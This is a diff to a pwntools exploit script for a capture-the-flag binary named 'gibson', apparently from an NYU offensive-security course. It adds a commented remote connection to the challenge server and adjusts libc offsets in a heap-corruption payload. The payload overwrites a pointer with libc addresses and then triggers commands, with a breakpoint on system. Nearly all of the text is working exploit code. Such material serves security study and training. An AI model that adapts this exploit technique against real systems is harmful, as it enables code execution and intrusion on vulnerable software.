@@ -3,6 +3,7 @@ from pwn import *
 context.arch='amd64'
 # context.terminal = ['tmux','split','-h']
 p=process("/opt/chal/gibson")
+# p=remote("http://offsec-chalbroker.osiris.cyber.nyu.edu/",8080)
 sla 	= lambda a,b: p.sendlineafter(a,b)
 sa 		= lambda a,b: p.sendafter(a,b)
 ra 		= lambda a,b: p.readuntil(a,b)
@@ -44,14 +45,12 @@ log.warning(hex(base))
 free("X")
 add("N",0x28)
 
-rdx = 0x0000000000001b92+base
-leave = 0x0000000000400a08
 
 
 pay = p64(0)*10+"n132\0\0\0\0"+p64(0)*9+p64(0x000000000603080)+p64(0x30)
 edit("B",pay)
 
-edit("n132",p64(0x453a0+base)+p64(0x7ffff7ada330-0x00007ffff7a0d000+base)+p64(0x00007ffff7a984f0-0x00007ffff7a0d000+base))
+edit("n132",p64(0x45390+base)+p64(0xcd2b0+base)+p64(0x8b470+base))
 cmd("exit")
 cmd("touch")
 # gdb.attach(p,'b system')
